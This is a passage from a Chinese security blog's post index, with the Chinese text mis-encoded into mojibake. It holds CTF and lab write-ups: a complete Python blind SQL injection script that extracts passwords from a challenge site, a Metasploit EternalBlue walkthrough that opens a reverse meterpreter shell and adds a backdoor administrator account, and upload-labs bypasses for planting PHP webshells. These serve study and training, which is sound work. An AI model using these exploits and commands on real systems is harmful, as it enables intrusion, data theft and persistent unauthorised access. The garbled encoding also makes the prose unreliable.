fuzzä¹‹åå¯ä»¥å‘ç°å¯¹äºä¸åŒçš„å­—ç¬¦ï¼Œå›æ˜¾ä¸åŒï¼Œå¹¶ä¸”è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½†æ˜¯^æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªç¬¦å· å¯ä»¥çœ‹åˆ°å½“id = 1 æ—¶ï¼Œé¡µé¢å›æ˜¾ä¸ºï¼Œå¯ä»¥å°†è¿™ä¸ªä¸ºåˆ¤æ–­çš„æ ‡å¿— 1^1^1 = 1 1^0^1 = 0 æ‰€ä»¥å¯ä»¥å°†æ³¨å…¥çš„payloadåŠ åˆ°ä¸­é—´ï¼Œä¾‹å¦‚ 1^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))=%d)^1&quot;%(i,ord(j)) æ³¨å…¥è„šæœ¬å¦‚ä¸‹ï¼Œä½¿ç”¨çš„æ˜¯äºŒåˆ†æ³• import requests import time url = &quot;http://6b5514f4-7df0-47b1-bca4-d13013ffd5d9.node3.buuoj.cn/search.php&quot; flag = &#x27;&#x27; def payload(i, j): time.sleep(1) # sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j) #æ•°æ®åº“åå­— # sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j) #è¡¨å # sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j) #åˆ—å sql = &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; % (i, j) data = &#123;&quot;id&quot;: sql&#125; r = requests.get(url, params=data) if &quot;Click&quot; in r.text: res = 1 else: res = 0 return res def exp(): global flag for i in range(1, 10000): print(i, &#x27;:&#x27;) low = 31 high = 127 while low &lt;= high: mid = (low + high) // 2 res = payload(i, mid) if res: low = mid + 1 else: high = mid - 1 f = int((low + high + 1)) // 2 if (f == 127 or f == 31): break # print (f) flag += chr(f) print(flag) exp() print(&#x27;flag=&#x27;, flag) åˆå­¦åˆ°äº†æ–°çš„æ³¨å…¥å§¿åŠ¿ï¼ŒçœŸä¸é”™ å‚è€ƒï¼šhttps://www.cnblogs.com/wangtanzhi/p/12305052.html","tags":[{"name":"äºŒåˆ†æ³¨å…¥","slug":"äºŒåˆ†æ³¨å…¥","permalink":"https://sunzhengyu99.github.io/tags/%E4%BA%8C%E5%88%86%E6%B3%A8%E5%85%A5/"},{"name":"æŠ¥é”™æ³¨å…¥","slug":"æŠ¥é”™æ³¨å…¥","permalink":"https://sunzhengyu99.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"},{"name":"unionæ–°å§¿åŠ¿","slug":"unionæ–°å§¿åŠ¿","permalink":"https://sunzhengyu99.github.io/tags/union%E6%96%B0%E5%A7%BF%E5%8A%BF/"}]},{"title":"ç½‘å®‰ä½œä¸š1","date":"2020-09-27T14:21:14.000Z","path":"2020/09/27/homework/","text":"MS17-010 1.å‡†å¤‡å·¥ä½œå¼€å¯ä¸¤å°è™šæ‹Ÿæœºï¼Œä¸€å°kaliä½œä¸ºæ”»å‡»æ–¹ï¼Œä¸€å°win7ä½œä¸ºè¢«æ”»å‡»æ–¹ å°†ä¸¤å°è™šæ‹Ÿæœºæ¡¥æ¥åˆ°åŒä¸€ç½‘å¡ï¼Œå¹¶ä¿è¯èƒ½å¤Ÿé€šä¿¡ Kali IP 10.1.1.1 255.0.0.0 win7 IP 10.1.1.2 255.0.0.0 æµ‹è¯•ä¸¤å°ä¸»æœºä¹‹é—´çš„é€šä¿¡æƒ…å†µ ä½¿ç”¨msfå‰éœ€è¦å¼€å¯postgresqlæœåŠ¡ å¼€å¯æœåŠ¡ï¼šservice postgresql start æŸ¥çœ‹æœåŠ¡çŠ¶æ€ï¼šservice postgresql status å¼€åˆ°ç»¿è‰²å­—ä½“çš„activeå³ä¸ºå¼€å¯äº† åˆå§‹åŒ–æ•°æ®åº“ï¼šmsfdb init 2. æ”»å‡»è¿‡ç¨‹(1).é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£ä½¿ç”¨nmap+ip æ‰«æ (2) .ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡»è¾“å…¥msfconsole å¯åŠ¨msf è¾“å…¥search MS17-010 æ‰¾åˆ°exploit windows/smb/ms17_010_eternalblue, è¿è¡Œ use exploitwindows/smb/ms17_010_eternalblue è¾“å…¥ show options æŸ¥çœ‹éœ€è¦é…ç½®å“ªäº›ä¿¡æ¯ RHOSTS ä¸ºç›®æ ‡ä¸»æœºIP(10.1.1.2) RPORT ä¸ºç›®æ ‡ç«¯å£å·(445) LHOST ä¸ºç›‘å¬ä¸»æœºIP(10.1.1.1) (3). é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥è¾“å…¥å‘½ä»¤ set payload windows/x64/meterpreter/reverse_tcp (4).å¼€å§‹è¿è¡Œè¾“å…¥ exploit/run æˆåŠŸè·å–shell æŸ¥çœ‹ipåœ°å€éªŒè¯æ˜¯å¦ä¸ºç›®æ ‡ä¸»æœºã€‚ (5)è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·åˆ›å»ºä¸€ä¸ªç”¨æˆ· net user test abc123.com /add Username:test password:abc123.com å°†è¯¥ç”¨æˆ·åŠ å…¥ç®¡ç†å‘˜ç»„ï¼Œä½¿å…¶æ‹¥æœ‰ç®¡ç†å‘˜æƒé™ net localgroup administrtors test /add ç›®æ ‡ä¸»æœºä¸Šç”¨æˆ·åˆ›å»ºæˆåŠŸ å®éªŒç»“æŸ","tags":[{"name":"msf","slug":"msf","permalink":"https://sunzhengyu99.github.io/tags/msf/"}]},{"title":"upload-11-21","date":"2020-09-18T13:58:51.000Z","path":"2020/09/18/upload2/","text":"upload-labs 11-21 pass11$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125; &#125; $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); è¿™æ®µä»£ç æ˜¯å°†æ–‡ä»¶åä¸­å‡ºç° deny_extçš„åç¼€åæ›¿æ¢ä¸ºç©º å¯ä»¥åŒå†™ç»•è¿‡ï¼Œå³1.pphphp pass12$is_upload = false; $msg = null; if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; &#125; &#125; æœ¬é¢˜ä¸ä¹‹å‰çš„é¢˜ç›®æœ‰æ‰€ä¸åŒï¼Œè¿™é¢˜çš„æ–‡ä»¶çš„ä¿å­˜è·¯å¾„æ˜¯å¯ä»¥æ§åˆ¶çš„ è¿™é‡Œç”¨çš„%00æˆªæ–­ï¼ŒåŸç†å¦‚ä¸‹ www.xxx.com/qq.jpg www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.phpå…¶åç¼€åä¸º.jpgå¯ä»¥ç»•è¿‡æ£€æµ‹ï¼Œä½†æ˜¯windowsç³»ç»Ÿå¤„ç†æ—¶ä¸ä¼šå¤„ç†%00ä¹‹åçš„å†…å®¹æ•…ä¿å­˜çš„æ–‡ä»¶å°±æ˜¯qq.php pass13è¿™é¢˜ä¸ä¸Šé¢˜åˆ©ç”¨çš„åŸç†ç›¸åŒ ä½†æ˜¯è¿™é‡Œè¦ä½¿ç”¨ 00çš„äºŒè¿›åˆ¶å½¢å¼ pass14æ˜ç¡®è¯´äº†ä¸Šä¼ å›¾ç‰‡æœ¨é©¬ function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType; &#125; GIF89a æ˜¯GIFå›¾ç‰‡çš„æ–‡ä»¶å¤´ ï¼Œæ˜¯ä¸ºäº†ç»•è¿‡gifæ–‡ä»¶çš„æ£€æŸ¥ å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œ æ¡Œé¢å»ºç«‹ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶å°†å…¶æ”¹ä¸º2.jpgï¼Œå†å»ºç«‹ä¸€ä¸ªæ”¹ä¸º1.php,å…¶å†…å®¹ä¸ºä½ æƒ³æ·»åŠ çš„ä¸€å¥è¯æœ¨é©¬ copy 2.jpg /b + 1.php /a webshell.jpg æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚","tags":[{"name":"åŒå†™ç»•è¿‡","slug":"åŒå†™ç»•è¿‡","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":"00æˆªæ–­","slug":"00æˆªæ–­","permalink":"https://sunzhengyu99.github.io/tags/00%E6%88%AA%E6%96%AD/"}]},{"title":"uploads-labs","date":"2020-09-16T13:48:48.000Z","path":"2020/09/16/uploads/","text":"upload-labs 1-10 pass1ç›´æ¥æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€åä¸ºjpg,png,gifå³å¯ pass2æŸ¥çœ‹æºç  if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) è¿™æ®µä»£ç è¯´æ˜æ˜¯å¯¹æ–‡ä»¶çš„MIMEç±»å‹è¿›è¡Œäº†è¿‡æ»¤ï¼Œç›´æ¥ä¸Šä¼  1.php æŠ“åŒ…åä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸º &#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;,è¿™ä¸‰ä¸ªç±»å‹éƒ½ä¸ºå›¾ç‰‡ æŠ“åŒ…ä¿®æ”¹MIMEå³å¯ çŸ¥è¯†ç‚¹è¡¥å……ï¼š MIMEç±»å‹å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œä½†æ˜¯ä¼ ç»Ÿå†™æ³•éƒ½æ˜¯å°å†™ã€‚ text/plain text/html image/jpeg image/png audio/mpeg audio/ogg audio/* video/mp4 application/* application/json application/javascript application/ecmascript application/octet-stream æ›´è¯¦ç»†çš„è§£é‡Šï¼Œ pass3$deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); åªç¦æ­¢äº†.asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨php3,php5,php7,phtmlç­‰ç­‰åç¼€åç»•è¿‡ pass4.htaccessæ–‡ä»¶çš„ä½œç”¨ URLé‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ MIMEç±»å‹é…ç½® è®¿é—®æƒé™æ§åˆ¶ç­‰ ä¸»è¦ä½“ç°åœ¨ä¼ªé™æ€çš„åº”ç”¨ å›¾ç‰‡é˜²ç›—é“¾ è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ é˜»æ­¢/å…è®¸ç‰¹å®šIP/IPæ®µ ç›®å½•æµè§ˆä¸ä¸»é¡µ ç¦æ­¢è®¿é—®æŒ‡å®šæ–‡ä»¶ç±»å‹ æ–‡ä»¶å¯†ç ä¿æŠ¤ &lt;FilesMatch &quot;1.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; è¿™å‡ å¥ä»£ç çš„æ„æ€ï¼š é€šè¿‡.htaccessæ–‡ä»¶è°ƒç”¨phpè§£æå™¨å»è§£æä¸€ä¸ªæ–‡ä»¶åä¸­åªè¦åŒ…å«â€1.jpgâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„ä»»æ„æ–‡ä»¶ï¼Œ æ— è®ºæ‰©å±•åæ˜¯ä»€ä¹ˆ(æ²¡æœ‰ä¹Ÿè¡Œ)ï¼Œéƒ½ä»¥phpçš„æ–¹å¼æ¥è§£æ ä¸Šä¼ å®Œ.htaccessæ–‡ä»¶åç›´æ¥ä¸Šä¼ ä¸€ä¸ª 1.jpgå³å¯ pass5$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125; &#125; æœ¬é¢˜ä¸ç¬¬åé¢˜å®Œå…¨ä¸€æ ·ï¼Œè¯¦ç»†è§£ç­”è§ç¬¬åé¢˜ pass6$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125; &#125; ä»”ç»†æŸ¥çœ‹æºç ä¼šå‘ç°å°‘äº†ä¸‹é¢çš„è¿™æ®µä»£ç  $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ è¿™é‡Œå°±å¯ä»¥å¤§å°å†™ç»•è¿‡ã€‚å°†æ–‡ä»¶åç¼€åæ”¹ä¸º.pHp , .PHPç­‰ pass7$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125; &#125; è·Ÿç¬¬å…­å…³å¯¹æ¯”å‘ç°å°‘äº†è¿™å¥è¯ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º åˆ©ç”¨Windowsç³»ç»Ÿçš„æ–‡ä»¶åç‰¹æ€§ã€‚æ–‡ä»¶åæœ€åå¢åŠ ç©ºæ ¼å’Œç‚¹ï¼Œå†™æˆ1.php .ï¼Œè¿™ä¸ªéœ€è¦ç”¨burpsuiteæŠ“åŒ…ä¿®æ”¹ï¼Œä¸Šä¼ åä¿å­˜åœ¨Windowsç³»ç»Ÿä¸Šçš„æ–‡ä»¶åæœ€åçš„ä¸€ä¸ª.ä¼šè¢«å»æ‰ï¼Œå®é™…ä¸Šä¿å­˜çš„æ–‡ä»¶åå°±æ˜¯1.php pass8$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125; &#125; è¿™æ®µä»£ç å°‘äº†è¿™å¥è¯ï¼Œå¯ä»¥ä¸ç¬¬å…­å…³ç›¸åŒçš„åšæ³• $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ pass9$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125; &#125; 